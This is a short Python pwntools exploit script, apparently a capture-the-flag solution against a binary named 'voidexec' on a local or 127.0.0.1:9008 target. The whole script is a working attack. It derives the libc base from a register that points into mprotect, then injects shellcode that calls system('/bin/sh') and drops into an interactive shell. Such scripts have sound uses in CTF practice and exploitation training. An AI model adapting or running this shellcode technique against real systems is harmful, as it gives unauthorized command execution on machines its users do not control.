#!/usr/bin/env python3
from pwn import *

# ------------------------- TARGET ------------------------- #
elf = context.binary = ELF("./voidexec")

# -------------------------- LIBC -------------------------- #
libc = ELF(elf.libc.path)
rop_libc = ROP(libc)

# -------------------------- ARGS -------------------------- #
if args.REMOTE:
    p = remote("127.0.0.1", 9008)
else:
    p = process(elf.path)
    if args.GDB:
        gdbscript = """
        c
        """
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #

# Compose shellcode to execute system("/bin/sh"):
sc = asm(f"""
sub rcx, {libc.sym.mprotect + 0x0b}
mov r12, rcx
add rcx, {libc.sym.system}
mov rdi, r12
add rdi, {next(libc.search(b'/bin/sh'))}
jmp rcx
""")
p.sendline(sc)

p.interactive()
